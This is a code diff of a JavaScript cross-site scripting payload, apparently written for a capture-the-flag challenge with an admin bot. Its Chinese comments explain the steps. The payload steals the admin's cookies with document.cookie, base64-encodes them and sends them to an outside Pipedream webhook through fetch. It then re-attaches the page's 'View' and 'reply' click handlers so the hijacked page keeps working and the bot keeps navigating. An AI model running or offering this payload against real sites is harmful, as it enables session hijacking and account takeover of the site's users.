@@ -1,11 +1,19 @@
-// 1. 偷取 Admin 的 Cookie 並傳送到你的接收端
-// 請將網址換成你的 Pipedream 或 Webhook 網址
-fetch('https://eos82zp0nc2qmhz.m.pipedream.net/?c=' + btoa(document.cookie));
+(async () => {
+    // 1. 偷 Cookie (傳送到 Pipedream)
+    fetch('https://eos82zp0nc2qmhz.m.pipedream.net/?flag=' + btoa(document.cookie));
 
-// 2. 核心：還原網頁原本的 "View" 功能
-// 因為我們劫持了 js，原本的跳轉功能會失效，如果不寫這段，Admin 機器人可能無法點進去
-document.querySelectorAll('.view').forEach((e) => {
-    e.addEventListener('click', () => {
-        window.location = `/comment/${e.id}`;
+    // 2. 還原原本按鈕的功能，確保 Admin 點擊時能跳轉
+    // 這樣機器人才會繼續執行後續動作，讓你成功觸發 XSS
+    document.querySelectorAll('.view').forEach((e) => {
+        e.addEventListener('click', () => {
+            window.location = `/comment/${e.id}`;
+        });
     });
-});
+
+    // 模擬原本的回覆功能 (可選，但為了保險可以加上)
+    document.querySelectorAll('.reply').forEach((e) => {
+        e.addEventListener('click', () => {
+            console.log('Admin clicked reply');
+        });
+    });
+})();
